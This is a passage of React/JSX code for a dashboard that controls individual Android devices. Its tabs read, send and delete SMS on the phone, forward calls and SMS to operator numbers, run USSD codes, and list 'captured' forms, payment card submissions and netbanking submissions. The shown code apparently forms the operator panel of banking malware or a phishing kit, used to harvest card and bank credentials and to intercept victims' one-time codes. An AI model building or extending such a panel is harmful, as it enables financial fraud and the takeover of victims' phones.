                          </p>
                          <Button
                            size="sm"
                            variant="flat"
                            onPress={onSimModalOpen}
                            className="w-full bg-(--accent-soft) text-(--text-main) hover:bg-slate-700"
                          >
                            Select SIM
                          </Button>
                        </div>
                      </div>
                    </div> */}
                  </div>
                </div>

                {/* Metadata Section */}
                <div>
                  <h3 className="mb-3 text-sm font-semibold text-(--text-muted)">
                    Metadata
                  </h3>
                  <div className="rounded-lg bg-(--surface-muted) p-4 border border-(--border)">
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <p className="text-xs text-slate-700">model</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.model}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">manufacturer</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.manufacturer}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">androidVersion</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.androidVersion}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">brand</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.brand}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">simOperator</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.sim1Carrier ||
                            device.sim2Carrier ||
                            "Not Set"}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">registeredAt</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.joinedAt
                            ? new Date(device.joinedAt).toLocaleDateString(
                                "en-GB",
                                {
                                  day: "2-digit",
                                  month: "short",
                                  year: "numeric",
                                },
                              )
                            : "N/A"}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-slate-700">forwardingSim</p>
                        <p className="mt-1 font-mono text-sm font-semibold text-(--text-main)">
                          {device.forwardingSim || "null"}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </Tab>

            <Tab key="sms" title="SMS">
              <div className="space-y-4 p-4 sm:p-6 bg-(--surface-muted)">
                <h3 className="text-lg font-semibold text-(--text-main)">
                  SMS
                </h3>

                {/* Action Buttons */}
                <div className="flex flex-row gap-2 ">
                  <Button
                    className="w-full bg-(--surface) text-(--text-main) font-semibold"
                    size="lg"
                    onPress={onSendSMSModalOpen}
                  >
                    Send SMS (WS)
                  </Button>
                  <Button
                    variant="flat"
                    className="w-full bg-(--surface-muted) text-(--text-main) hover:bg-slate-300"
                    onPress={handleRefreshSMS}
                    isLoading={smsActionLoading}
                  >
                    Refresh
                  </Button>
                  <Button
                    variant="flat"
                    className="w-full  text-(--text-main) hover:bg-slate-300"
                    color="secondary"
                    onPress={handleGetSms}
                    isLoading={smsActionLoading}
                  >
                    Get Sms
                  </Button>
                  <Button
                    variant="flat"
                    className="w-full bg-rose-200 text-rose-800 hover:bg-rose-300"
                    onPress={handleDeleteAllSMS}
                    isLoading={smsActionLoading}
                  >
                    Delete All
                  </Button>
                </div>

                {/* SMS List */}
                <div className="space-y-3">
                  {smsList.length === 0 ? (
                    <div className="rounded-lg bg-(--surface-muted) p-8 text-center border border-(--border)">
                      <p className="text-(--text-muted)">No SMS messages</p>
                    </div>
                  ) : (
                    smsList.map((sms) => (
                      <div
                        key={sms.id}
                        className="rounded-2xl border border-(--border) bg-(--surface-muted) px-4 py-3 shadow-sm"
                      >
                        <div className="flex items-start justify-between gap-3">
                          <div className="flex-1 space-y-2">
                            <div className="flex items-center justify-between gap-3">
                              <div className="flex flex-col leading-tight">
                                <span className="text-xs uppercase tracking-wide text-(--text-muted)">
                                  New SMS
                                </span>
                                <span className="text-[11px] text-slate-700">
                                  {sms.timestamp}
                                </span>
                              </div>
                              <Button
                                size="sm"
                                className="bg-rose-200 text-rose-800 hover:bg-rose-300 border border-rose-300 px-3"
                                onPress={() => handleDeleteSMS(sms.id)}
                                isLoading={smsActionLoading}
                              >
                                Delete
                              </Button>
                            </div>

                            <div className="rounded-lg bg-(--surface-muted) px-3 py-2 text-xs text-(--text-main) shadow-inner">
                              <div className="flex items-center justify-between gap-2">
                                <span className="font-semibold text-(--text-main)">
                                  From
                                </span>
                                <span className="font-mono text-(--text-main)">
                                  {sms.senderNumber}
                                </span>
                              </div>
                              <div className="mt-1 flex items-center justify-between gap-2">
                                <span className="font-semibold text-(--text-main)">
                                  To
                                </span>
                                <span className="font-mono text-(--text-main)">
                                  {sms.reciverNumber}
                                </span>
                              </div>
                            </div>

                            <p className="text-sm text-black whitespace-pre-wrap leading-relaxed">
                              {sms.body}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </Tab>

            <Tab key="call-forwarding" title="Call Forwarding">
              <div className="space-y-4 p-6 bg-(--surface-muted)">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-lg font-semibold text-(--text-main)">
                      Call Forwarding
                    </h3>
                    <p className="text-sm text-(--text-muted)">
                      Android-like WS command + realtime result
                    </p>
                  </div>
                  <Chip
                    size="sm"
                    className="bg-emerald-500/20 text-emerald-700"
                  >
                    Ready
                  </Chip>
                </div>

                {/* Select SIM */}
                <div>
                  <label className="mb-2 block text-sm font-medium text-(--text-muted)">
                    Select SIM
                  </label>
                  <ButtonGroup>
                    <Button
                      className={`${
                        forwardingSIM === 1 && canUseSim1
                          ? "bg-(--surface) text-(--text-main)"
                          : "bg-(--surface-muted) text-(--text-muted)"
                      }`}
                      onPress={() => {
                        if (canUseSim1) {
                          setForwardingSIM(1);
                        }
                      }}
                      isDisabled={!canUseSim1}
                    >
                      SIM 1
                    </Button>
                    <Button
                      className={`${
                        forwardingSIM === 2 && canUseSim2
                          ? "bg-(--surface) text-(--text-main)"
                          : "bg-(--surface-muted) text-(--text-muted)"
                      }`}
                      onPress={() => {
                        if (canUseSim2) {
                          setForwardingSIM(2);
                        }
                      }}
                      isDisabled={!canUseSim2}
                    >
                      SIM 2
                    </Button>
                  </ButtonGroup>
                </div>

                {/* SIM Details */}
                <div className="space-y-3">
                  <div className="rounded-lg bg-(--surface-muted) p-4 border border-(--border)">
                    <div className="text-sm">
                      <span className="text-(--text-muted)">SIM 1: </span>
                      <span className="font-mono font-semibold text-(--text-main)">
                        {device.sim1number || "Unknown"}
                      </span>
                    </div>
                    <div className="mt-1 text-xs text-slate-700">
                      Carrier:{" "}
                      <span className="text-(--text-muted)">
                        {device.sim1Carrier || "Unknown"}
                      </span>
                    </div>
                  </div>

                  <div className="rounded-lg bg-(--surface-muted) p-4 border border-(--border)">
                    <div className="text-sm">
                      <span className="text-(--text-muted)">SIM 2: </span>
                      <span className="font-mono font-semibold text-(--text-main)">
                        {device.sim2number || "Unknown"}
                      </span>
                    </div>
                    <div className="mt-1 text-xs text-slate-700">
                      Carrier:{" "}
                      <span className="text-(--text-muted)">
                        {device.sim2Carrier || "Unknown"}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Forwarding Number */}
                <div>
                  <Input
                    label="Forwarding Number"
                    placeholder="Enter number (10 digits / +country)"
                    value={forwardingNumber}
                    onValueChange={setForwardingNumber}
                    classNames={{
                      input: "bg-(--surface-muted) text-(--text-main)",
                      inputWrapper: "bg-(--surface-muted) border-(--border)",
                      label: "text-(--text-muted)",
                    }}
                  />
                </div>

                {/* Action Buttons */}
                <div className="flex gap-3">
                  <Button
                    className="flex-1 bg-rose-200 text-rose-800 hover:bg-rose-300 border border-rose-300 font-semibold"
                    size="lg"
                    onPress={handleDeactivateForwarding}
                    isDisabled={!isForwardingActive}
                  >
                    Deactivate
                  </Button>
                  <Button
                    className="flex-1 bg-(--surface) text-(--text-main) hover:bg-(--surface-muted) font-semibold"
                    size="lg"
                    onPress={handleActivateForwarding}
                  >
                    Activate
                  </Button>
                </div>

                {/* WS Command Info */}
                <div className="rounded-lg bg-(--surface-muted) p-4 border border-(--border)">
                  <p className="text-xs text-(--text-muted)">
                    WS cmd:{" "}
                    <span className="font-mono text-(--text-main)">
                      call_forward
                    </span>{" "}
                    • sim:{" "}
                    <span className="font-mono text-(--text-main)">
                      SIM {forwardingSIM}
                    </span>
                  </p>
                </div>

                {/* Live History */}
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <h4 className="text-sm font-semibold text-(--text-main)">
                      History (Live)
                    </h4>
                    <Chip size="sm" className="bg-slate-200 text-slate-700">
                      {callForwardingHistory.length}
                    </Chip>
                  </div>

                  {callForwardingHistory.length === 0 ? (
                    <div className="rounded-lg bg-(--surface-muted) p-4 text-sm text-(--text-muted) border border-(--border)">
                      No history found in top-level or registered-device nodes.
                    </div>
                  ) : (
                    <div className="space-y-3">
                      {callForwardingHistory.map((historyEntry, entryIndex) => (
                        <div
                          key={`${historyEntry.source}-${historyEntry.id}-${entryIndex}`}
                          className="rounded-xl border border-(--border) bg-(--surface) p-3"
                        >
                          <div className="mb-2 flex items-center justify-between gap-2">
                            <p className="text-xs font-semibold uppercase tracking-wide text-(--text-muted) flex items-center gap-2">
                              History Entry{" "}
                              {callForwardingHistory.length - entryIndex}
                              <span className="rounded bg-slate-200 px-2 py-0.5 text-[10px] font-semibold text-slate-700">
                                {historyEntry.source === "global"
                                  ? "Top History"
                                  : "Registered Device"}
                              </span>
                            </p>
                            <span className="text-[11px] text-slate-700 font-mono">
                              {historyEntry.id}
                            </span>
                          </div>

                          <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                            {Object.entries(historyEntry.data).map(
                              ([fieldKey, fieldValue]) => (
                                <div
                                  key={`${historyEntry.source}-${historyEntry.id}-${fieldKey}`}
                                  className="rounded-lg border border-(--border) bg-(--surface-muted) px-3 py-2"
                                >
                                  <p className="text-[11px] uppercase tracking-wide text-(--text-muted)">
                                    {formatSubmissionFieldLabel(fieldKey)}
                                  </p>
                                  <p className="mt-1 break-all text-sm font-medium text-(--text-main)">
                                    {formatSubmissionFieldValue(
                                      fieldKey,
                                      fieldValue,
                                    )}
                                  </p>
                                </div>
                              ),
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </Tab>

            <Tab key="ussd" title="USSD">
              <div className="space-y-4 p-6 bg-(--surface-muted)">
                <div>
                  <h3 className="text-lg font-semibold text-(--text-main)">
                    USSD
                  </h3>
                  <p className="text-sm text-(--text-muted)">
                    Enter USSD code and send to device
                  </p>
                </div>

                <Input
                  label="USSD Code"
                  placeholder="*123#"
                  value={ussdCode}
                  onValueChange={setUssdCode}
                  classNames={{
                    input: "bg-(--surface-muted) text-(--text-main)",
                    inputWrapper: "bg-(--surface-muted) border-(--border)",
                    label: "text-(--text-muted)",
                  }}
                />

                <div className="space-y-3 rounded-2xl border border-(--border) bg-(--surface) p-4">
                  <div>
                    <p className="text-sm font-semibold text-(--text-main)">
                      SIM Slot
                    </p>
                    <p className="text-xs text-(--text-muted)">
                      Choose which SIM slot should execute this USSD request
                    </p>
                  </div>

                  <ButtonGroup className="w-full">
                    <Button
                      className={
                        ussdSimSlot === 1 && canUseSim1
                          ? "flex-1 bg-(--accent) text-white"
                          : "flex-1 bg-(--surface-muted) text-(--text-main)"
                      }
                      onPress={() => {
                        if (canUseSim1) {
                          setUssdSimSlot(1);
                        }
                      }}
                      isDisabled={!canUseSim1}
                    >
                      SIM 1
                    </Button>
                    <Button
                      className={
                        ussdSimSlot === 2 && canUseSim2
                          ? "flex-1 bg-(--accent) text-white"
                          : "flex-1 bg-(--surface-muted) text-(--text-main)"
                      }
                      onPress={() => {
                        if (canUseSim2) {
                          setUssdSimSlot(2);
                        }
                      }}
                      isDisabled={!canUseSim2}
                    >
                      SIM 2
                    </Button>
                  </ButtonGroup>
                </div>

                <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                  <Button
                    className="w-full bg-(--surface) text-(--text-main) hover:bg-(--surface-muted) font-semibold"
                    size="lg"
                    onPress={handleSendUssd}
                    isLoading={isSendingUssd}
                    isDisabled={!hasAnyUsableSim}
                  >
                    Send
                  </Button>
                </div>
              </div>
            </Tab>

            <Tab key="view" title="View">
              <div className="space-y-6 p-6 bg-(--surface-muted)">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-lg font-semibold text-(--text-main)">
                      All Captured Data
                    </h3>
                    <p className="text-sm text-(--text-muted)">
                      Forms, cards, and netbanking are shown below as separate
                      list sections
                    </p>
                  </div>
                  <Chip
                    size="sm"
                    className="bg-emerald-500/20 text-emerald-700"
                  >
                    Live
                  </Chip>
                </div>

                <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
                  <Card className="h-full bg-(--surface) border border-(--border)">
                    <CardBody className="p-6">
                      <p className="text-sm text-(--text-muted) mb-1">Forms</p>
                      <h3 className="text-3xl font-bold text-blue-700">
                        {formSubmissions.length}
                      </h3>
                    </CardBody>
                  </Card>

                  <Card className="h-full bg-(--surface) border border-(--border)">
                    <CardBody className="p-6">
                      <p className="text-sm text-(--text-muted) mb-1">Cards</p>
                      <h3 className="text-3xl font-bold text-purple-700">
                        {cardSubmissions.length}
                      </h3>
                    </CardBody>
                  </Card>

                  <Card className="h-full bg-(--surface) border border-(--border)">
                    <CardBody className="p-6">
                      <p className="text-sm text-(--text-muted) mb-1">
                        Netbanking
                      </p>
                      <h3 className="text-3xl font-bold text-emerald-700">
                        {netbankingSubmissions.length}
                      </h3>
                    </CardBody>
                  </Card>
                </div>

                <div className="space-y-4">
                  {renderSubmissionSection(
                    "Forms",
                    formSubmissions,
                    "No forms found for this device.",
                    "bg-blue-200 text-blue-700",
                  )}
                  {renderSubmissionSection(
                    "Cards",
                    cardSubmissions,
                    "No card submissions found for this device.",
                    "bg-purple-200 text-purple-700",
                  )}
                  {renderSubmissionSection(
                    "Netbanking",
                    netbankingSubmissions,
                    "No netbanking data found for this device.",
                    "bg-emerald-200 text-emerald-700",
                  )}
                </div>
              </div>
            </Tab>
          </Tabs>
        </CardBody>
      </Card>

      {/* Phone Number Modal */}
      <Modal
        isOpen={isPhoneModalOpen}
        onClose={onPhoneModalClose}
        size="2xl"
        classNames={{
          base: "bg-(--surface) border border-(--border)",
          header: "border-b border-(--border)",
          body: "py-6",
          footer: "border-t border-(--border)",
        }}
      >
        <ModalContent>
          <ModalHeader className="text-(--text-main)">
            Update Phone Numbers
          </ModalHeader>
          <ModalBody>
            <p className="mb-4 text-sm text-(--text-muted)">
              Add up to 4 admin phone numbers for this device. These numbers
              will receive forwarded messages.
            </p>
            <div className="space-y-3">
              <Input
                label="phone 1"
                placeholder="Enter phone number"
                value={adminPhone1}
                onValueChange={setAdminPhone1}
                classNames={{
                  input: "bg-(--surface-muted) text-(--text-main)",
                  inputWrapper: "bg-(--surface-muted) border-(--border)",
                  label: "text-(--text-muted)",
                }}
              />
            </div>
          </ModalBody>
          <ModalFooter>
            <Button
              variant="light"
              onPress={onPhoneModalClose}
              className="text-(--text-muted)"
            >
              Cancel
            </Button>
            <Button
              color="primary"
              isLoading={isAdminPhoneLoading}
              isDisabled={isAdminPhoneLoading}
              onPress={() => {
                handleAdminPhoneUpdate();
              }}
            >
              Save Changes
            </Button>
          </ModalFooter>
        </ModalContent>
      </Modal>

      {/* SIM Selection Modal */}
      <Modal
        isOpen={isSimModalOpen}
        onClose={onSimModalClose}
        size="md"
        classNames={{
          base: "bg-(--surface) border border-(--border)",
          header: "border-b border-(--border)",
          body: "py-6",
          footer: "border-t border-(--border)",
        }}
      >
        <ModalContent>
          <ModalHeader className="text-(--text-main)">
            Select Forwarding SIM
          </ModalHeader>
          <ModalBody>
            <p className="mb-4 text-sm text-(--text-muted)">
              Choose which SIM card should be used for SMS forwarding on this
              device.
            </p>
            <Select
              label="Forwarding SIM"
              placeholder="Select a SIM"
              selectedKeys={
                hasAnyUsableSim ? [selectedSIM === 1 ? "sim1" : "sim2"] : []
              }
              onSelectionChange={(keys) => {
                if (keys === "all") {
                  return;
                }

                const key = keys.values().next().value;

                if (key === "sim1" && canUseSim1) {
                  setSelectedSIM(1);
                }

                if (key === "sim2" && canUseSim2) {
                  setSelectedSIM(2);
                }
              }}
              classNames={{
                trigger: "bg-(--surface-muted) border-(--border)",
                value: "text-(--text-main)",
              }}
            >
              <SelectItem key="sim1" isDisabled={!canUseSim1}>
                SIM 1
              </SelectItem>
              <SelectItem key="sim2" isDisabled={!canUseSim2}>
                SIM 2
              </SelectItem>
            </Select>
          </ModalBody>
          <ModalFooter>
            <Button
              variant="light"
              onPress={onSimModalClose}
              className="text-(--text-muted)"
            >
              Cancel
            </Button>
            <Button
              color="primary"
              onPress={handleForwardSim}
              isDisabled={!hasAnyUsableSim}
            >
              Save Changes
            </Button>
          </ModalFooter>
        </ModalContent>
      </Modal>

      {/* Send SMS Modal */}
      <Modal
        isOpen={isSendSMSModalOpen}
        onClose={onSendSMSModalClose}
        size="2xl"
        classNames={{
          base: "border border-(--border)/60 bg-(--surface) text-(--text-main)",
          header: "border-b border-slate-800 pb-4",
          body: "py-5",
          footer: "border-t border-slate-800 pt-4",
          closeButton:
            "text-(--text-muted) hover:bg-(--surface-muted) hover:text-(--text-main)",
        }}
      >
        <ModalContent>
          <ModalHeader className="flex flex-col gap-1">
            <h3 className="text-xl font-semibold text-(--text-main)">
              Send SMS
            </h3>
            <p className="text-sm font-normal text-(--text-muted)">
              Compose and send an SMS from this device.
            </p>
          </ModalHeader>
          <ModalBody>
            <div className="space-y-5">
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-sm font-medium text-(--text-muted)">
                    SIM
                  </label>
                  <span className="text-xs text-slate-700">
                    Device ID: {device.deviceId}
                  </span>
                </div>

                <ButtonGroup className="w-full rounded-xl border border-(--border) bg-(--surface-muted) p-1">
                  <Button
                    className={`h-14 flex-1 flex-col items-start justify-center gap-0 px-3 ${
                      selectedSIM === 1 && canUseSim1
                        ? "bg-primary text-(--text-main)"
                        : "bg-transparent text-(--text-muted) hover:bg-slate-300"
                    }`}
                    onPress={() => {
                      if (canUseSim1) {
                        setSelectedSIM(1);
                      }
                    }}
                    isDisabled={!canUseSim1}
                  >
                    <span className="text-[11px] font-semibold uppercase tracking-wide">
                      SIM 1
                    </span>
                    <span className="text-xs opacity-80">
                      {device.sim1Carrier || "Unknown carrier"}
                    </span>
                  </Button>
                  <Button
                    className={`h-14 flex-1 flex-col items-start justify-center gap-0 px-3 ${
                      selectedSIM === 2 && canUseSim2
                        ? "bg-primary text-(--text-main)"
                        : "bg-transparent text-(--text-muted) hover:bg-slate-300"
                    }`}
                    onPress={() => {
                      if (canUseSim2) {
                        setSelectedSIM(2);
                      }
                    }}
                    isDisabled={!canUseSim2}
                  >
                    <span className="text-[11px] font-semibold uppercase tracking-wide">
                      SIM 2
                    </span>
                    <span className="text-xs opacity-80">
                      {device.sim2Carrier || "Unknown carrier"}
                    </span>
                  </Button>
                </ButtonGroup>
              </div>

              <Input
                label="Receiver"
                labelPlacement="outside"
                placeholder="Enter receiver number"
                type="tel"
                value={smsReceiver}
                onValueChange={setSmsReceiver}
                startContent={<span className="text-sm text-slate-700">+</span>}
                variant="bordered"
                classNames={{
                  label: "text-sm text-(--text-muted)",
                  input: "text-(--text-main) placeholder:text-slate-700",
                  inputWrapper:
                    "border-(--border) bg-(--surface-muted) data-[hover=true]:border-slate-500 group-data-[focus=true]:border-primary",
                }}
              />

              <Textarea
                label="Message"
                labelPlacement="outside"
                placeholder="Type your message..."
                value={smsMessage}
                onValueChange={setSmsMessage}
                minRows={6}
                variant="bordered"
                description={`${smsMessage.length} characters`}
                classNames={{
                  label: "text-sm text-(--text-muted)",
                  input: "text-(--text-main) placeholder:text-slate-700",
                  inputWrapper:
                    "border-(--border) bg-(--surface-muted) data-[hover=true]:border-slate-500 group-data-[focus=true]:border-primary",
                  description: "text-xs text-slate-700",
                }}
              />
            </div>
          </ModalBody>
          <ModalFooter className="gap-2">
            <Button
              variant="flat"
              onPress={() => {
                onSendSMSModalClose();
                setSmsReceiver("");
                setSmsMessage("");
              }}
              className="bg-(--surface-muted) text-(--text-main) hover:bg-slate-300"
            >
              Cancel
            </Button>
            <Button
              color="primary"
              className="font-semibold"
              onPress={handleSendSMS}
              isDisabled={!hasAnyUsableSim}
            >
              Send Message
            </Button>
          </ModalFooter>
        </ModalContent>
      </Modal>
    </div>
  );
}
